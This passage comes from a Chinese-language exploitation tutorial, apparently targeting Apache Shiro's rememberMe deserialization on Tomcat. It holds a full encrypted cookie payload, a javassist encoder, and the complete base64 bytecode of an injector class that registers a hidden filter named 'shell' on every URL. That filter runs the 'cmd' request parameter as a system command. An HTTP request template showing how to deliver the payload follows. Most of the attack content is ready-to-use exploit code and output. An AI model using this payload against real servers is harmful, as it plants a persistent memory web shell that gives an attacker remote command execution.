D5CyX/hWX4BNYJZPlIIQXVmJKvDjrhbJWc70bwLyPG1K6XxmTuZbwVkqWT41IbdvUTV0U1cTSsNq5U4OseMo24Xi3VjeZW/s+p32g+9hRhxn8OF+9YuewI/j7PyK0fyEyfBotFuCE4HZCJxXkNJ5cFmFZmJb48cxhYiUi+64Wd6//D+obOdJH8jKHlkgar7ZlTph39AvVdifEV4cMGcKYOAdQrSZOLeOxC0na34KvgTcGqjvpWHZR2o8h1MCAtfLe4QDNnKbZb+5G00IIAPULLIuCR0CZRAvB/Q9NVCmzOeE3GkzJoRbraMJ7/q2QBEZYjvHwD19PDMbZZPlKfX4tkeiML2gZOfGhItdv/R0PfOzVHxqESYiDE50Eh1YtcfCPzebc1ZTksz6WX0HkygOXD5rp+lXRz6s5z1y6ZMm1VvEddjhdg1APpZJCUeZbQ2zL0z0b52X2eDafkeowHE/VgIJ2bBTTro/VtV4i/leRnfnufhmhq8dKZPWpTwrNhqkj0rVbUZfCJHAdSRwA6XIZIO1+UGiyGEveCWGHGRyJRzvcVIl0Z33d0JSPvdjeUC2Vc/Zyxfu3JP0WdU0ablMWEmOb5FdRfps6VdMPnl3ktXTbMdVtSOZLP7Sn5eY+1YhlprmjvkSAbx/RyzGK5JDcvU4P1u5c0yhG1oanSgdpU/D8Ui0AvgCPti09bdpNgPXSEJhrPBH7x/FSzSpP9dgtlCHJ7XBLkNwSg2bacVtWx2Wky5UT57Ps7+vxZ657XgEzUcFqTgGKDqvqwD98uvMG/sALtD1VmSzNcGACRVHSdNvN3pnUNGvWNJiY5p8nYS2FEjs4RLT52TxoymwP7m2pnNmt+2Rc5qyB8d0xkLNivHSbHPROAWzTBbI7kEg0WzTQuUvaVljrLVWpGYSOkut2dHG0be9FvSL09btR42pTcUnlT+W+WMKkcf2hu2th4dtbkES+rP9OWn8dnWa1ET2O96FEfvszO2FU1W7CH2qa8Psr9jYVYsYk1iIgjcIXy8WG4xzbomtPkYxID2SH34/+HFD68nQOTZ4G90BUZifmNkxkd+CkDNiqQphibiQPuJ4Vt8Kni3olcNnWF0r3QQY2PV95B9nAJ3q1mmzDH1/WSX0JYPc4o850jzZ6V/sm0qQpwXtm2ujUjLrq186HS+jGKpLBgcn+Xle21Cgitj8Q59w/OzYNBtD6Ioom0iPvA4fyq+hzzLWFTSCRBMMpEGAHnHLiI9FFyw+qJcf52AhSiwbB1Ayq5U2cZInaamHv2xsIrlK4qeXMkdMveblXiLVLVRYEN7od1WcZxV56dHqBD023ZWY+IxcVUSjlSQbIOuFasBUDusUDVYcoe5wufCfQ1orfKK9HK8Mib7Qf/A9+PLCSOd/8pCB0BicS/6cHGNVgJJBgrABopb4Y6ovR0XNSzZsNG7qme2VfVIx/B9ALAsNHLmP7ffEkhPawWjCSw8O1bqQbQDhlreAXgGI4hB3JazKKdBi81l2rxjRa8mYZxOh7onldpU0YGBaihm1RPxMvH6omZEXNjV18guAu3Mf2Oo9AMT3oIkCxdpQ8TL9C04RBkq5WMxd25uveQJm3TfR2klWb4aOfFUQe4uYYo8Kq4aRXqqzppWJhC2MR1g0lHd3lHqcWLzUTSrl/bVxOq5wO+wGI+hstB0vSK1xwvNIzeqCzN9jdkx7q6R+hR7L1sxT9hhvZ0d4oOo1Bp2GAfTovV9f3KzeX8MQKufO5Ww/F1cyEtqfoFzgzhLpbieQV89vB4Lkf26+yMJb4JDcUwbQn0s6gQapLbODYPj0BiO+WWs0cm484jhsymj6uwtBVu5oErtA0v4MnkK86xgqHgxcux2/aEzyFuL/9ilJuvO6AmFR/Av2lfX0AYDvS7DUYcmr0sRRroTT3ekVybH1/F0F9aiHThzpebkSO8stIcrQFvQjahLH5ZFNgqNKm+o56NJEmNVi8FfOCRVqYgENqBfI4W02vbpCJBriwQhzkoztbGHH6KX9nqFYh1QhRKUuXxfqylVoVADpMTJYL6UM9yleVCXdRPGd/C3d6KEB5/Qot+0rtmfrJpGgG413eYx7CsOh2f44oCrFV/oviGn5aSLM28Lq8BjOq9/GmWV2roue1evFoKFgSdA0ISSVba5gZLsor2RD9E1U4/TXw+8SQUNPqsaDCkgaJEpsiK9sEX6ePCwuIDwAEz4FBluEfQRhAi8SQfxP//VBwmNjWIC/ge8jvt7Tn6AUSpbfG4QTsbl4nNFrMC+xpAJkCB+Xq0Y8m78OfpQCzm50ut6Di98ZsP6WNhcZYkeFey/Sq3sx7WAoAhvpynU9AW0tkSYRD9mo4+OLx8GgDN92AiTXR39EUF21O9ufHczHR03XQ0P0LZ/5yN6BgzAhh0SrN4YxuppM3EitSRptzeVDC3i1y07mkgIQ/MS3YeRaknDjvWf17tOb2H97VRXtq9LaCI7i4xV5LV7nXqN0w8vfNFG81sOe92PYIe4PSMJqoKwuVx0B7o3a9xwFcBBXyCxcI6gVwg/HYPuwGWb7KmUmVqBI21aC6VfB6KBvXPlqjHOKBkdnUTPmf9nfBBBIk3QDKPlDTEK6U2ZQM//A8/4YMv2m+x0BA8+3BM6rwiIJc3kFSNfNd2LQMUu5UggpjBX3YmCJWseRO69qrN7iEPZpsonmFiKNvnTFmrw+JP3HOHFNJ6ajYDXJUKxTnUX+pNDd3D9VPS0fWV9nZYnEdbaxYmC9sC6D30QlmoEbyaJW4WObE2d6u01f8kGnwnR73KVTosqLwZKYlcOjGNYQo4GAh9oITSIs6R8btDPlT0A+Mt9BtzPpevrXL5iXToTQFhwHyiHxijvRxZSrwOboORerMtNE0DCGQN8Lsa5hh6Rg3Ur7cLIdzBKTUsZFVTJskXy6qaOYr/t//O39EFCx17JD4oRXeKKlypOcQQmT21PddTbowsqZUct56ZUOYc9MFBj1swmFlDmgNxX35Y36rLXgkNUZig/qb2/JcSUY4QLikcAyHe5haUkf7yRcoZtpOY5+ZNN5JwwlI0k9A3wJaibkk88r2CaGcz+y0DsiRz1Muo43FAMPoRSobI1D2XriyJgChOhae/7+RolU9bvZ1wXrHPFlsz1BwP7bVUc43WcVIGiYhNOrKDmOXZ3WG06lXd8PUyDSvD1L+k9doOOIifNU2R4QuhHME6ROcAskdFOH7uo2wmlPFSEYK8Vv7ncX9gYsSVOh6IgiOQOloraTs/KgylIhtWkAXYCIxy++aLeTD7S58UbXKLmLT9nuRu/L5DWR5I2TYAhRWdl5rfQzuZVcC3KZtY59E0RSxWPiMR8ODUNjF44nWbzA1eFTGRoXVgtf4Z3QtMNmHay6i7EAe8ISYJdpgf8JIZtndhcbh5IPAonx5QadtBz+ke8BSdOybkAeCgoqVEiAtHYO7HfuUglRmLL9+HlbjSS+pOqb0JAbjqzT6LULhLK8zxNEt6exvQNzlUOmq/ssHUyXJioxBA7c9eBqRFWFk/3QlQX9e7eKVs4n1RfmDFXaCU3TL3ntIbBPIHq9rdJSuh3tCyvzax9geWvw2ILeGqXfU6oO81wbT23oD9sUKw3WqgXzgJwGx0UD+eKgqzPIjQqxIdlxREZQr4g2CtvGJzTJYQAhak7XJn1EFTj4gY9bW/n7Xq5xnQHqcd69xjCDFk3zWdJBfpD8wLncTcc/w4Y0+gsyIho6QOw74iuFQXQOLmKuBSRIprQZmkKHD9WWYAGwXSyk/S+KzWb+NnliBTtVOfdNYEn/eiOwaO/59OWwa40bJ1IJ/oGJMzl6tojgYm39csE5KJtoxBVDGa18ea1anHw6xPLHPTJP/v83dWfRyYht+TEzLSuWWNUCGdQ2HuG4ID8busc2LYlGxZ1dE3WciQvH7BZKXRhiZ+6rCn9EoaRIxgkpNeKkwYglI/Wf4qdOf66UvAnabbyFcRJ8WmzGhZPTmGVx/4XalDbEQGeLhVL3NbLpERAXxT3EqJ1uVqsbVFjicXBhY/4VNlzAnzjBKSfc9YA01pWlBqR/nlwjJEysJZE6q8SBhxRozhDjXCeWNbvCQxu6vGRMsxYBwpXJEsjKtoq1DzKCIncgfwDFXI2NPZgM0hofKACvQBJOW6wnJLu3lUeotgsnYnlpbg2hmiMwL7mOy6tSQd46I1bIsst2o+IcgIn5XL2yk79NMf9PLgkjk37YG4ny7yzycCeAm+Q2H3MeU3+mXpefV0AlUsVjbNqHGCHSjBI8UIi4i7S0paVPCcOA+6qtP087egrvgute1g2N1XeQ4ZpSHAjuX6cY3EdquYi8XkEan/H9vTZ61mru8g0cd1rAsbD38yMqWEVdtjPWL+NJ+R6D5KOEb8s8CyHNFnkXFOnrPESPuqWhJ8XGBYSt8OdFgT9/gfrM6R6OpRe6alBTy1A74agsr6SfSaTyhjQItYUQJkkXBVa+9u93yabH33axkatPJnNpTeY+gzdY75ov5YlGcl93L1c4uurQUukGY2zSLlgbyNm85hq6M0c6W2MFw6zT2BbQm9TAeFRy2fGLwzaC30qznSvqZHqc3lrtwJzq+T+j/wQZw6KALS/iTZ7y08FLbILBtfcOvbyY8YjbqivgC8C0nVPq9ZyDCaNZG5H98cVGccZzWx2UwwBy9K+XTExVp+U/gkDjYXQKwvzodCMDjI8zSA1h5GvLAPIZ6gPqfnEKc2KYSBgwMiWqEAdev7QHqT6b6B9Zc+kRnpe6z/0CZdXQY+qsE6XSIb4OYf+GCZujzMsBkU7TXo4OI5YLD26Rxk1g5fl2zqHC0sBi6jj8hA2womDc6hS1PCPY8SWJOA8EWdkTp26TevD0P4joHQLHpHrGdV0/pFH1u/rsGmNV5TNyn0AoGonPOTm6ub/sFONj6izJfCYOHq6GsoNu5OojrrvQBQK/l/NYGHjG5KVjFxC6W1cBqSvJzGeMPZcculuKj5B/N7WPLcbhHn1+x3zfxHwIf6AAFEc8Fr4exl/w7aRuw98cIv5hi4yrR5Fz12fNZBv3GckZQp9I9U7iKY2LBX06mwxgg0q/xxbRMkLFFGp4gZh4ys5G0sOF08Q67W0S22rQeK2Zg4+QLrk3ngNtgvF8+NirjP59PHkSrjwneT5TFYOiiXG3FNaQIoJHD/dfyaL0duXYMe+EJYTXC9ZDhlZEn7WF+Ph/uiI5OdjGq5aa/m1eqZ7yB8jZux5swpui2qJG+Ytq6Hw5hjN/q1e5ppmbCFNzI5vpb3wjjcsmBnXeYA3OlmJtyV1zR4ehmQ7BxBiPCfyknkYBfsyt7HrEZQnnAeUDUbhWsG34xGpi3TetRmQgWitMtVn0QtdITnhkDgs7u+Qgo0fPPiAearutl0ElWTAnpKA9sX2HVyv4VPL/k0tS4F/JxFN2NjksJUXCNavY2jC2/PIYDpGHQQER/4MCRsqMCoDLYQW9nyCVRhUNOyE6AyRQfpevVzJ0gdKF0jgAEiK513Uh/rDcVTTlOOtCm+r6ff4jUv82yNfbjlk6bnWju27W2VjceITtXfv0eGfHFDGO0Tiyl2uYHo20mXnbK+7K1JeCjhfUrjNL5oIkwHA0OQzUg9lYrAPxHc55LS2b1fk8ZJ2Bds7QvYvbEl4NwdB7cL/oEhQ7WadQeGE8GiPygtNExm/5SwNQuz3oWEjQd4z+c4/17bLDHT9ipjYxO41oA0pgOnpt1R08U8AwNbMY/CtedHsHCzYdgKpaqIrS81XN98D++XGqgoCDgXIrFsmczeMDgmLmZtckObqynogOpl3eyc/8sGaz44UwFdY12A/AV4hk5cjREDs/o6Pn0furD4dB054/ytU/wbO6vkj2fgfjWy1nKjCKu009zWb1FcIYwCzefplxEi5hFNJPbLVoUiP6JCjlXIulfWCbS8DsNP8N1NaPCIKyu5X8/uzSYJqCUIkRurk06vxH2LU1+Jzqtvbh1UuT0yDTeyBKjgiDmigtAhu8ULlYAEUsiHSaRpVSS+LbMYfhrUdG3OJWMDgrAV9LRnEEbHk2Za772/iTLbcJCuhmclPfKlJgBDUfn8FI9gCTO9qHUxCSs1aI8FiwXc3cBotv6+3GGUgIe2vkQ+97cMz1Dj4/3oOdfNWb3X0y2tOMooEtQpbdPFiCGoN0yk6lxv1/mMgpvxLWnayxPkoYPm4WEtSEKxrJtZmn/Y9ZxGkV+Xd2IluuVPnAMXJfZpOo0BQdwd/2L5y6P93VHMNcZxj+nZw6bTqsH5bby+RUDRPGoTul78C484jFL9G6bUawi21wQxfvSFhqAZyllmHiVZBBWToQybxGHP5Ha7HM/d4alnY3XmdDfhOt2Ab9gTAEADlQI7jkQfkcykBoWXUmPX3VVphYAbdr/AlXwHqJN1U9aWFriunWXFA9pN4/AHx9n4AIuY4jI5/ZckimRuBu52KYpiYsRwE6FWZiRI3m4D/fmqtTON33WXTZel+u6KS3QggCd0ElOMlswc9UzhtFCgesPVujrWGcEBV0iBQtD3DEf2ZTYQ6tRwnNsXiH7uud1Scx2Fqw8XFArLecFLnNSd4OWiCEc/NrAs3VTrBdlCx9VP0QOzekfqYHTnTF6Ia8zyi7Oeh8JwcygJWqSjtRW28AIQOzehSVK5+w5IJr5YImOm1YnPSDjJMrPT3XXt9ScfM8+v3KxidtGMf7TXIoQwJzcSe+L+O+VccX2s18oTHraxQj1cpaI3A+W0t3Fp8wn3+zeQWyPckKygmnqcia7OHoeMmUzJO1i6uOz9eBiCWZPNo8O0MtlrcGrXkAgOc+rfQQrv89OL8C8WgUBwdqosAOcPY0wCbnEELxs6plbZ09v8CCWrqNAhFqbPvDszuQMp74jHLGdXj0Dbf54/WefCVOAomA+mprATJ3M8t3vBXht2ON+/0i5NJFORWYWVbGHU4DUbi2FjskaF3Yi79J+9MMx6xMeDfaJWVFL9vO/uFc0mBU1YimJQLjaXWXEjRbSRMDaYenXCNy99e86zfyqM7XC463ujFS/B8ArPsTqb+FLzXMDdg8270zMW5pGm11UTJftUylfg1+H7mKKDwRz/tDqmanoHZp3HeZ7+jEXPC1NNEdH6dw2+V8z+azorwxS0cL7P8jrMhehF73poK2Ve1b1b0N1mKZDhK6PrCDkipmH66Khxn49Y4S0P+NzKWmtOQwawjKASpBcOUpZGgEZDLRA9q/q55LyY3Ovi4Ng26kWJkz+UnqK/+ou8IcqduqeSONb8euioxc4L9JC8iQzspVwiWqGfCkUoL7C4kSmEGdoR4Sn1qha+pg4ir1INof4wkGAWWIaAfN8sI9doX1e2S4jnAoMuofY1JU+UB538q0SH+Qs2IpPs/L7/FC1S+6B8jqqUoKZnxxSUiIc1yiOg+FopV7r6/kOyvqauIQelIttR30yQYgHj2nQ+5kHULWwHvqRyL8DX6CQgVuLqqowBC8ox2m8UQMJAAx7mUj/1c7+7e/CfbUQftCNdy9A730vUjtdWhLC7hMPQar1a9bb959ORfyHLuFXTo=
```

我们再生成一下post data部分

```java
import javassist.*;
import java.util.Base64;

public class DumpBase64 {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        // 从类路径获取CtClass对象
        CtClass ctClass = pool.get("Inject");

        // 转换为字节数组
        byte[] classBytes = ctClass.toBytecode();
        // 使用BASE64Encoder进行Base64编码
        String code = Base64.getEncoder().encodeToString(classBytes);
        System.out.println(code);
    }
}
```

输出结果

```plain
yv66vgAAADQAtwoASgBLCgBKAEwHAE0IAE4KABEATwoAUABRCgBQAFIHAFMKAAgAVAcAVQcAVgoAVwBYCQAyAFkKAFoAWwcAXAgAXQcAXgcAXwkAYABhCgARAGIKAGMAUQcAZAoAYABlCgBjAGYKABEAZwcAaAoAMwBpCABqCgAyAGsKADIAbAcAbQoAHwBpCABuCgAfAG8KAB8AcAoAFgBxCgARAHIKAB8AcwcAdAoAJwBpCgAnAG8IAHUKACcAdgoACgB3CgAKAHgKAAoAeQkAegB7CAB8CgB9AH4HAH8HAIABAARjb2RlAQASTGphdmEvbGFuZy9TdHJpbmc7AQAKZ2V0Q29udGV4dAEALCgpTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQ7AQAEQ29kZQEADVN0YWNrTWFwVGFibGUHAH8HAE0HAFYBAAlnZXRGaWx0ZXIBABgoKUxqYXZheC9zZXJ2bGV0L0ZpbHRlcjsBAApFeGNlcHRpb25zAQAGPGluaXQ+AQADKClWAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAQTWV0aG9kUGFyYW1ldGVycwEACGRvY3VtZW50AQAIaGFuZGxlcnMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBAAdoYW5kbGVyBwCBDACCAIMMAIQAhQEAMG9yZy9hcGFjaGUvY2F0YWxpbmEvbG9hZGVyL1dlYmFwcENsYXNzTG9hZGVyQmFzZQEACXJlc291cmNlcwwAhgCHBwCIDACJAIoMAIsAjAEALW9yZy9hcGFjaGUvY2F0YWxpbmEvd2VicmVzb3VyY2VzL1N0YW5kYXJkUm9vdAwANgCNAQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAEAE2phdmEvbGFuZy9FeGNlcHRpb24HAI4MAI8AkgwANAA1BwCTDACUAJUBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwEAAltCBwCWDACXAJgMAJkAmgcAmwEAEGphdmEvbGFuZy9PYmplY3QMAJwAnQwAngCfDACgAKEBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgwAQABBAQcQeXY2NnZnQUFBRFFBVVFvQUVBQWhDQUFpQ3dBakFDUUtBQ1VBSmdvQUpRQW5Cd0FvQndBcENnQXFBQ3NLQUFjQUxBb0FCZ0F0Q2dBR0FDNExBQzhBTUFvQU1RQXlDd0F6QURRSEFEVUhBRFlCQUFZOGFXNXBkRDRCQUFNb0tWWUJBQVJEYjJSbEFRQUlaRzlHYVd4MFpYSUJBRzBvVEdwaGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjWFZsYzNRN1RHcGhkbUY0TDNObGNuWnNaWFF2YUhSMGNDOUlkSFJ3VTJWeWRteGxkRkpsYzNCdmJuTmxPMHhxWVhaaGVDOXpaWEoyYkdWMEwwWnBiSFJsY2tOb1lXbHVPeWxXQVFBTlUzUmhZMnROWVhCVVlXSnNaUWNBTndjQU9BY0FLQUVBQ2tWNFkyVndkR2x2Ym5NSEFEa0hBRG9CQUJCTlpYUm9iMlJRWVhKaGJXVjBaWEp6QVFBSGNtVnhkV1Z6ZEFFQUNISmxjM0J2Ym5ObEFRQUZZMmhoYVc0TUFCRUFFZ0VBQTJOdFpBY0FPd3dBUEFBOUJ3QStEQUEvQUVBTUFFRUFRZ0VBRm1waGRtRXZhVzh2UW5WbVptVnlaV1JTWldGa1pYSUJBQmxxWVhaaEwybHZMMGx1Y0hWMFUzUnlaV0Z0VW1WaFpHVnlCd0E0REFCREFFUU1BQkVBUlF3QUVRQkdEQUJIQUVnSEFFa01BRW9BU3djQVRBd0FUUUJPQndCUERBQVVBRkFCQUFoTlpXMVRhR1ZzYkFFQUhXcGhkbUY0TDNObGNuWnNaWFF2YUhSMGNDOUlkSFJ3Um1sc2RHVnlBUUFRYW1GMllTOXNZVzVuTDFOMGNtbHVad0VBRVdwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56QVFBVGFtRjJZUzlwYnk5SlQwVjRZMlZ3ZEdsdmJnRUFIbXBoZG1GNEwzTmxjblpzWlhRdlUyVnlkbXhsZEVWNFkyVndkR2x2YmdFQUpXcGhkbUY0TDNObGNuWnNaWFF2YUhSMGNDOUlkSFJ3VTJWeWRteGxkRkpsY1hWbGMzUUJBQXhuWlhSUVlYSmhiV1YwWlhJQkFDWW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBRVdwaGRtRXZiR0Z1Wnk5U2RXNTBhVzFsQVFBS1oyVjBVblZ1ZEdsdFpRRUFGU2dwVEdwaGRtRXZiR0Z1Wnk5U2RXNTBhVzFsT3dFQUJHVjRaV01CQUNjb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN6c0JBQTVuWlhSSmJuQjFkRk4wY21WaGJRRUFGeWdwVEdwaGRtRXZhVzh2U1c1d2RYUlRkSEpsWVcwN0FRQVlLRXhxWVhaaEwybHZMMGx1Y0hWMFUzUnlaV0Z0T3lsV0FRQVRLRXhxWVhaaEwybHZMMUpsWVdSbGNqc3BWZ0VBQ0hKbFlXUk1hVzVsQVFBVUtDbE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQ1pxWVhaaGVDOXpaWEoyYkdWMEwyaDBkSEF2U0hSMGNGTmxjblpzWlhSU1pYTndiMjV6WlFFQUNXZGxkRmR5YVhSbGNnRUFGeWdwVEdwaGRtRXZhVzh2VUhKcGJuUlhjbWwwWlhJN0FRQVRhbUYyWVM5cGJ5OVFjbWx1ZEZkeWFYUmxjZ0VBQjNCeWFXNTBiRzRCQUJVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tWWUJBQmxxWVhaaGVDOXpaWEoyYkdWMEwwWnBiSFJsY2tOb1lXbHVBUUJBS0V4cVlYWmhlQzl6WlhKMmJHVjBMMU5sY25ac1pYUlNaWEYxWlhOME8weHFZWFpoZUM5elpYSjJiR1YwTDFObGNuWnNaWFJTWlhOd2IyNXpaVHNwVmdBaEFBOEFFQUFBQUFBQUFnQUJBQkVBRWdBQkFCTUFBQUFSQUFFQUFRQUFBQVVxdHdBQnNRQUFBQUFBQkFBVUFCVUFBd0FUQUFBQWVBQUZBQWdBQUFCVEt4SUN1UUFEQWdBNkJCa0V4Z0ErdUFBRUdRUzJBQVU2QmJzQUJsbTdBQWRaR1FXMkFBaTNBQW0zQUFvNkJoa0d0Z0FMV1RvSHhnQVJMTGtBREFFQUdRZTJBQTJuLytxbkFBc3RLeXk1QUE0REFMRUFBQUFCQUJZQUFBQVRBQVQrQUM0SEFCY0hBQmdIQUJuNUFCZ0NCd0FhQUFBQUJnQUNBQnNBSEFBZEFBQUFEUU1BSGdBQUFCOEFBQUFnQUFBQUFBPT0MADYANwwAPQA+AQAvb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJEZWYBAAVzaGVsbAwAogCjDACkAKUMAKYApwwAqACpDACqAKMBAC9vcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlck1hcAEAAi8qDACrAKMMAKwArQwArgCvDACwALEHALIMALMAtAEADOazqOWFpeaIkOWKnwcAtQwAtgCjAQAGSW5qZWN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAHygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvQ29udGV4dDsBABBqYXZhL3V0aWwvQmFzZTY0AQAKZ2V0RGVjb2RlcgEAB0RlY29kZXIBAAxJbm5lckNsYXNzZXMBABwoKUxqYXZhL3V0aWwvQmFzZTY0JERlY29kZXI7AQAYamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyAQAGZGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQANc2V0RmlsdGVyTmFtZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACXNldEZpbHRlcgEAGShMamF2YXgvc2VydmxldC9GaWx0ZXI7KVYBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAA5zZXRGaWx0ZXJDbGFzcwEADWFkZFVSTFBhdHRlcm4BAAxhZGRGaWx0ZXJEZWYBADQoTG9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyRGVmOylWAQASYWRkRmlsdGVyTWFwQmVmb3JlAQA0KExvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlck1hcDspVgEAC2ZpbHRlclN0YXJ0AQADKClaAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuACEAMgAzAAAAAQAAADQANQAAAAUAAQA2ADcAAQA4AAAAWwACAAUAAAAvuAABtgACwAADTBIDEgS2AAVNLAS2AAYsK7YAB8AACE4ttgAJwAAKOgQZBLBNAbAAAQAKACsALAALAAEAOQAAABIAAf8ALAACBwA6BwA7AAEHADwAAQA9AD4AAgA4AAAAbgAGAAYAAABiuAAMKrQADbYADky4AAG2AAJNEg8SEAa9ABFZAxISU1kEsgATU1kFsgATU7YAFE4tBLYAFS0sBr0AFlkDK1NZBAO4ABdTWQUrvrgAF1O2ABjAABE6BBkEtgAZwAAaOgUZBbAAAAAAAD8AAAAEAAEACwABAEAAQQACADgAAABuAAIABQAAAGIqtwAbKhIctQANKrYAHUwqtgAeTbsAH1m3ACBOLRIhtgAiLSy2ACMtLLYAJLYAJbYAJrsAJ1m3ACg6BBkEEiG2ACkZBBIqtgArKy22ACwrGQS2AC0rtgAuV7IALxIwtgAxsQAAAAAAPwAAAAQAAQALAAEAQgBDAAIAOAAAAA0AAAADAAAAAbEAAAAAAEQAAAAJAgBFAAAARgAAAAEAQgBHAAIAOAAAAA0AAAAEAAAAAbEAAAAAAEQAAAANAwBFAAAASAAAAEkAAAABAJEAAAAKAAEAWgBXAJAACQ==
```

这部分填充到数据包

```http
POST / HTTP/1.1
Host: 192.168.1.100:8080
Content-Type: application/x-www-form-urlencoded
Cookie: rememberMe=ShellLoader部分Payload

code=上面输出的内容，记得发的时候要url编码一下
```

yakit可以用这个标签实现url编码

![image](assets/image-20250708141446-ebabqfr.png)

构造请求包并发出

![image](assets/image-20250708141436-0w3gka8.png)

成功

![image](assets/image-20250708141431-fm5sftq.png)
